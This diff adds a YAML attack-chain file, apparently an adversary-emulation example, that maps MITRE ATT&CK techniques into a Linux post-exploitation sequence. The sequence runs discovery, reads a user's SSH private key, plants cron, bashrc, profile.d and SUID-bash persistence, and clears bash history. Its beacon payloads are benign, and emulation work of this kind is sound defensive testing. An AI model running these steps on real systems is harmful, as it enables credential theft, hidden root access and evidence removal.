@@ -1,0 +1,349 @@
+# linux-full-chain.yaml
+#
+# Full post-exploitation chain on a Linux victim — five phases:
+#
+#   Phase 1 — Probe      : detect OS and kernel, abort if not Linux
+#   Phase 2 — Discovery  : system info, accounts, network config,
+#                          open connections, sensitive-file hunt  (all parallel)
+#   Phase 2.5 — Cred Hunt: extract first regular user from account_discovery
+#                          output via output_extract, then use {{target_user}}
+#                          and {{victim_hostname}} substitution to hunt SSH keys
+#                          and (conditionally) exfiltrate the private key
+#   Phase 3 — Persistence: four parallel paths, each independent:
+#                            A) cron      — check_crontab → cron_persistence
+#                                           (gracefully skipped when cron absent)
+#                            B) bashrc    — ~/.bashrc append (always succeeds)
+#                            C) profile.d — /etc/profile.d/ drop (root, system-wide)
+#                            D) suid bash — SUID bash copy as last-resort foothold
+#   Phase 4 — Evasion    : clear bash history after all persistence paths settle
+#
+# Demonstrates:
+#   • output_var capture and {{VarName}} substitution in command arguments
+#   • output_extract with a named regex group to pull a sub-value from step output
+#     (target_user extracted from /etc/passwd lines in accounts_raw)
+#   • cross-step variable forwarding: target_user flows from account_discovery
+#     through ssh_key_hunt into read_privkey
+#   • conditions in sigma-style form (e.g. victim_os|contains: Linux, target_user|matches: "\\S+")
+#     to gate steps based on prior step output
+#   • parallel execution (steps with the same depends_on run concurrently)
+#   • on_fail: skip_dependents to abort a sub-graph cleanly
+#   • on_fail: continue so surviving paths don't block the chain
+#   • realistic multi-mechanism persistence (container-safe, no systemd/cron req.)
+#
+# MITRE coverage:
+#   T1082      System Information Discovery
+#   T1087      Account Discovery
+#   T1016      System Network Configuration Discovery
+#   T1049      System Network Connections Discovery
+#   T1083      File and Directory Discovery
+#   T1552.004  Unsecured Credentials: Private Keys
+#   T1059.004  Unix Shell — cron persistence
+#   T1546.004  Unix Shell Configuration Modification
+#                (bashrc, profile.d, bash.bashrc)
+#   T1548.001  Abuse Elevation Control — SUID bash copy
+#   T1070.001  Indicator Removal: Clear Linux History
+#
+# Usage:
+#   SESSION=$(curl -s http://127.0.0.1:18080/api/v1/sessions | jq -r '.[0].id')
+#   CHAIN_ID=$(curl -s -X POST http://127.0.0.1:18080/api/v1/chains \
+#     -H 'Content-Type: application/yaml' \
+#     --data-binary @examples/linux-full-chain.yaml | jq -r .id)
+#   EXEC_ID=$(curl -s -X POST http://127.0.0.1:18080/api/v1/chains/${CHAIN_ID}/execute \
+#     -H 'Content-Type: application/json' \
+#     -d "{\"session_id\":\"${SESSION}\"}" | jq -r .execution_id)
+#   curl -N http://127.0.0.1:18080/api/v1/executions/${EXEC_ID}/stream
+
+id: linux-full-chain
+name: "Linux Post-Exploitation: Discovery → Multi-Path Persistence → Evasion"
+description: >
+  Multi-phase attack chain simulating realistic Linux post-exploitation.
+  Starts with OS detection, fans out into parallel recon, then extracts the
+  first regular system user from account discovery output and uses that
+  variable to hunt for SSH private keys — demonstrating output_extract and
+  {{VarName}} template substitution across steps.  Afterwards, four
+  independent persistence mechanisms run in parallel (cron, bashrc,
+  profile.d, SUID bash); the bashrc payload is tagged with the captured
+  hostname.  Finishes by clearing bash history to erase evidence.
+mitre_tactics:
+  - discovery
+  - credential-access
+  - persistence
+  - privilege-escalation
+  - defense-evasion
+tags:
+  - example
+  - linux
+  - post-exploitation
+  - full-chain
+
+steps:
+
+  # ── Phase 1: Environment probe ──────────────────────────────────────────────
+
+  - id: check_os
+    name: "Probe — Detect OS"
+    action:
+      type: probe
+      probe:
+        kind: os
+        platform: linux
+    output_var: victim_os
+    on_fail: abort           # cannot proceed without knowing the OS
+
+  - id: check_kernel
+    name: "Probe — Detect kernel version"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: probe
+      probe:
+        kind: kernel
+        platform: linux
+    output_var: kernel_ver
+    on_fail: continue
+
+  # ── Phase 2: Parallel discovery ─────────────────────────────────────────────
+  # All five steps below share the same depends_on so they run concurrently.
+
+  - id: sysinfo
+    name: "T1082 — System Information Discovery"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1082
+        test: 0              # "System info enumeration (Linux)"
+    output_var: sysinfo_out
+    timeout: "30s"
+    on_fail: continue
+
+  - id: account_discovery
+    name: "T1087 — Account Discovery"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1087
+        test: 0              # "Enumerate local users (Linux)"
+    output_var: accounts_raw
+    # Extract the first regular (UID ≥ 1000) username from /etc/passwd output.
+    # Output lines look like: ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
+    # group 1 captures the username; forwarded as {{target_user}} downstream.
+    output_extract:
+      - var: target_user
+        regex: "([^:\n]+):x:1[0-9]{3}:"
+        group: 1
+    timeout: "15s"
+    on_fail: continue
+
+  - id: hostname_probe
+    name: "Probe — Capture hostname"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: command
+      command:
+        interpreter: sh
+        cmd: "hostname"
+    output_var: victim_hostname
+    timeout: "5s"
+    on_fail: continue
+
+  - id: net_config
+    name: "T1016 — Network Configuration Discovery"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1016
+        test: 0              # "Network configuration enumeration (Linux)"
+    timeout: "15s"
+    on_fail: continue
+
+  - id: net_connections
+    name: "T1049 — System Network Connections Discovery"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1049
+        test: 0              # "List network connections (Linux)"
+    timeout: "15s"
+    on_fail: continue
+
+  - id: file_discovery
+    name: "T1083 — File and Directory Discovery"
+    depends_on: [check_os]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1083
+        test: 0              # "Find sensitive files (Linux)"
+    timeout: "60s"
+    on_fail: continue
+
+  # ── Phase 2.5: Targeted credential hunt ─────────────────────────────────────
+  #
+  # Demonstrates output_extract + {{VarName}} substitution:
+  #   • target_user  — extracted from accounts_raw via output_extract regex
+  #   • victim_hostname — captured by hostname_probe
+  #
+  # ssh_key_hunt uses {{target_user}} directly in its shell command.
+  # read_privkey is only executed when ssh_key_hunt output contains "id_rsa",
+  # showing how a step's output_var can gate a downstream condition.
+
+  - id: ssh_key_hunt
+    name: "T1083 — SSH private-key hunt for captured user"
+    depends_on: [account_discovery]
+    conditions:
+      # Only proceed if output_extract successfully captured a username.
+      - target_user|matches: "\\S+"
+    action:
+      type: command
+      command:
+        interpreter: sh
+        # {{target_user}} is substituted at execution time from the variable
+        # extracted by account_discovery's output_extract rule.
+        cmd: "find /home/{{target_user}}/.ssh -maxdepth 1 -type f 2>/dev/null"
+    output_var: ssh_keys_found
+    timeout: "10s"
+    on_fail: continue
+
+  - id: read_privkey
+    name: "T1552.004 — Exfiltrate SSH private key for captured user"
+    depends_on: [ssh_key_hunt]
+    conditions:
+      # Gate on ssh_key_hunt output: only read the key if an RSA key file exists.
+      - ssh_keys_found|contains: id_rsa
+    action:
+      type: command
+      command:
+        interpreter: sh
+        # {{target_user}} is still in scope — variables persist across all steps
+        # for the lifetime of the execution.
+        cmd: "cat /home/{{target_user}}/.ssh/id_rsa 2>/dev/null"
+    output_var: private_key_data
+    timeout: "10s"
+    on_fail: continue_no_err
+
+  # ── Phase 3: Multi-Path Persistence ─────────────────────────────────────────
+  #
+  # Four independent paths fan out in parallel after account_discovery.
+  # Each has on_fail: continue so a failure in one path never blocks the others.
+  #
+  # Path A — Cron (gracefully skipped when crontab binary is absent)
+  # Path B — ~/.bashrc append       (user-level, no daemon required)
+  # Path C — /etc/profile.d/ drop   (system-wide login shells, root required)
+  # Path D — SUID bash copy         (local privilege-escalation foothold, root)
+
+  # ── Path A: cron ─────────────────────────────────────────────────────────────
+
+  - id: check_crontab
+    name: "Probe — Check crontab binary exists"
+    depends_on: [account_discovery]
+    action:
+      type: probe
+      probe:
+        kind: software_exists
+        software: crontab
+        platform: linux
+    on_fail: continue_no_err  # no crontab → skip Path A, do not fail the chain
+
+  - id: cron_persistence
+    name: "T1059.004 — Cron job persistence"
+    depends_on: [check_crontab]
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1059.004
+        test: 2              # "Cron-based persistence (execution via cron)"
+        args:
+          command: "id >> /tmp/.scenario_beacon.log"
+    timeout: "15s"
+    on_fail: continue_no_err  # optional: cron path may fail in containers
+
+  # ── Path B: ~/.bashrc ────────────────────────────────────────────────────────
+
+  - id: persist_bashrc
+    name: "T1546.004 — Persist via ~/.bashrc"
+    # hostname_probe added so {{victim_hostname}} is guaranteed to be set.
+    depends_on: [account_discovery, hostname_probe]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1546.004
+        test: 0              # "Persist via ~/.bashrc"
+        args:
+          # {{victim_hostname}} is substituted from the hostname_probe output_var,
+          # tagging the beacon log with the specific host for easy correlation.
+          command: "id >> /tmp/.bashrc_beacon_{{victim_hostname}}.log"
+          marker: "scenario-bashrc-persistence"
+    timeout: "10s"
+    on_fail: continue
+
+  # ── Path C: /etc/profile.d/ ──────────────────────────────────────────────────
+
+  - id: persist_profile_d
+    name: "T1546.004 — Persist via /etc/profile.d/ (system-wide)"
+    depends_on: [account_discovery]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1546.004
+        test: 1              # "Persist via /etc/profile.d/"
+        args:
+          command: "id >> /tmp/.profile_d_beacon.log"
+          script_name: "99-update-check.sh"
+    timeout: "10s"
+    on_fail: continue
+
+  # ── Path D: SUID bash ────────────────────────────────────────────────────────
+
+  - id: persist_suid_bash
+    name: "T1546.004 / T1548.001 — Drop SUID bash for persistent shell access"
+    depends_on: [account_discovery]
+    conditions:
+      - victim_os|contains: Linux
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1546.004
+        test: 3              # "Drop SUID copy of bash"
+        args:
+          suid_path: "/tmp/.bash_update"
+    timeout: "10s"
+    on_fail: continue
+
+  # ── Phase 4: Defense evasion ────────────────────────────────────────────────
+  # Waits for all four persistence paths to settle before erasing tracks.
+  # on_fail: continue on every persistence step means we always reach here.
+
+  - id: clear_history
+    name: "T1070.001 — Clear bash history"
+    depends_on:
+      - sysinfo
+      - read_privkey        # wait for credential hunt sub-chain to settle
+      - {any: [cron_persistence, persist_bashrc, persist_profile_d, persist_suid_bash]}
+    action:
+      type: atomic
+      atomic_ref:
+        id: T1070.001
+        test: 2              # "Clear bash history (Linux)"
+    timeout: "10s"
+    on_fail: continue
